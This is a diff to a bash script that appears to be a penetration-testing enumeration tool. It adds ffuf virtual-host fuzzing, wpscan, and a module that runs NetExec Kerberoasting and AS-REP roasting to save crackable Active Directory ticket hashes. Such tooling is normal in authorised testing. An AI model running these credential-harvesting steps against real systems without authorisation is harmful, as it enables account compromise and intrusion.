+      FFUF_ARGS=(ffuf -s -u "${SCHEME}://${IP}" -H "Host: FUZZ.${DOMAIN}" -w "$DNS_WL" -t 15 -timeout 5 -fc 404,400 -ac -noninteractive)
+      [[ -n "$INSECURE" ]] && FFUF_ARGS+=(-k)
+      show "$(cmdline "${FFUF_ARGS[@]}")"
+      run "${FFUF_ARGS[@]}"
+    fi
+
+    subsection "WordPress Scan"
+    if require_tool wpscan; then
+      WPSCAN_ARGS=(wpscan --url "$BASE_URL" --no-banner)
+      [[ "$SCHEME" == "https" ]] && WPSCAN_ARGS+=(--disable-tls-checks)
+      show "$(cmdline "${WPSCAN_ARGS[@]}")"
+      run "${WPSCAN_ARGS[@]}"
     fi
   done
-else
-  warn "no web ports - skipping ffuf"
-fi
+}
+
+# roasting module -----------------------------------------------------------------------
+
+mod_roasting() {
+  section 'Roasting'
+  require_tool nxc || return
+
+  if [[ -z "$USER_ARG" || -z "$PASS_ARG" ]]; then
+    warn "credentials required for roasting - use -u and -p flags"
+    return
+  fi
+
+  [[ ${#LDAP_PORTS[@]} -eq 0 ]] && {
+    warn "no LDAP ports found - skipping roasting"
+    return
+  }
+
+  info "ports: ${LDAP_PORTS[*]}"
+
+  ROAST_TARGET="${DOMAIN:-$IP}"
+  ROAST_AUTH=(-u "$USER_ARG" -p "$PASS_ARG")
+
+  # Kerberoasting
+  subsection "Kerberoasting"
+  NXC_ARGS=(nxc ldap "$ROAST_TARGET" "${ROAST_AUTH[@]}" --kerberoasting kerberoasting.txt)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+
+  # AS-REP roasting
+  subsection "AS-REP Roasting"
+  NXC_ARGS=(nxc ldap "$ROAST_TARGET" "${ROAST_AUTH[@]}" --asreproast asreproast.txt)
+  show "$(cmdline "${NXC_ARGS[@]}")"
+  run "${NXC_ARGS[@]}"
+}
+
+# Module dispatch ------------------------------
+for m in ${MODULES[*]}; do
+  if [[ " $SELECTED " != *" $m "* ]]; then
+    continue
+  fi
+  case "$m" in
+  web) mod_web ;;
+  smb) mod_smb ;;
+  ldap) mod_ldap ;;
+  ftp) mod_ftp ;;
+  winrm) mod_winrm ;;
+  creds) mod_creds ;;
+  roasting) mod_roasting ;;
+  esac
+done
 
 log ""
 log " ${DIM}Full log saved: $LOGFILE${RESET}"
